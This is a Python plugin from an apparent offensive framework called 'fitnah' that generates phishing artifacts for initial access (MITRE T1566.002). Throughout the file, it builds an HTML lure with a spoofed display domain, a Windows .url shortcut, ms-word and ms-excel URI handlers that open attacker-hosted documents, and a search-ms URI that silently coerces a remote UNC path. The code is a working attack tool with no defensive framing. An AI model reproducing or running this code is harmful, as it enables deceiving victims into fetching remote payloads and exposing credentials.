"""initial_access/phish_link — generate phishing link/lure artifacts. MITRE T1566.002"""
import base64
import urllib.parse
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class PhishLink(BasePlugin):
    NAME        = "phish_link"
    DESCRIPTION = "Generate phishing link with HTML lure, Office URI handler payload, and shortcut .url file."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1566.002"
    CATEGORY    = "initial_access"
    schema      = ParamSchema().add(
        Param("url",        str,  required=True,  help="Payload delivery URL"),
        Param("lure_text",  str,  required=False, default="Click here to view the secure document",
              help="Anchor / button text"),
        Param("target",     str,  required=False, default="", help="Target person / email note"),
        Param("format",     str,  required=False, default="html",
              help="Output: html | url_file | office_uri | all"),
        Param("lure_domain", str, required=False, default="",
              help="Display domain to spoof e.g. sharepoint.com (shows in HTML only)"),
    )

    @mitre("T1566.002")
    def run(self, session, params, ctx=None) -> ModuleResult:
        url          = params["url"]
        lure_text    = params.get("lure_text", "Click here to view the secure document")
        target       = params.get("target", "")
        fmt          = params.get("format", "html").lower()
        lure_domain  = params.get("lure_domain", "").strip()

        display_url = f"https://{lure_domain}/..." if lure_domain else url
        results = []

        if target:
            results.append(f"Target: {target}")
        results.append(f"Payload URL: {url}")

        # HTML email / page lure
        if fmt in ("html", "all"):
            html = (
                f'<a href="{url}" style="background:#0078d4;color:#fff;padding:10px 20px;'
                f'text-decoration:none;border-radius:4px;font-family:Arial">'
                f'{lure_text}</a>'
                f'<br><small style="color:#888">{display_url}</small>'
            )
            results.append("\n--- HTML Lure ---")
            results.append(html)

        # Windows .url shortcut (opens URL in browser / Office URI handler)
        if fmt in ("url_file", "all"):
            url_file = (
                "[InternetShortcut]\n"
                f"URL={url}\n"
                "IconIndex=0\n"
                "IconFile=C:\\Windows\\System32\\shell32.dll\n"
            )
            results.append("\n--- .url Shortcut ---")
            results.append(url_file)

        # Office URI protocol handler (ms-word:ofv|u|https://... auto-opens Word to download)
        if fmt in ("office_uri", "all"):
            encoded_url = urllib.parse.quote(url, safe="")
            office_uri  = f"ms-word:ofv|u|{url}"
            excel_uri   = f"ms-excel:ofv|u|{url}"
            results.append("\n--- Office URI Handlers ---")
            results.append(f"Word:  {office_uri}")
            results.append(f"Excel: {excel_uri}")
            results.append(f"HTML:  <a href=\"{office_uri}\">{lure_text} (Word)</a>")

        # search-ms URI (triggers File Explorer search pane, can load remote DLL via UNC)
        if fmt == "all":
            # Encode a search-ms URI that opens a UNC path silently
            unc = url.replace("https://", "\\\\").replace("/", "\\")
            search_uri = f"search-ms:query=documents&crumb=location:{urllib.parse.quote(unc)}"
            results.append("\n--- search-ms URI (UNC coerce) ---")
            results.append(f"URI: {search_uri}")
            results.append(f"HTML: <a href=\"{search_uri}\">Open shared folder</a>")

        return ModuleResult.ok(data="\n".join(results), loot_kind="phish_link")
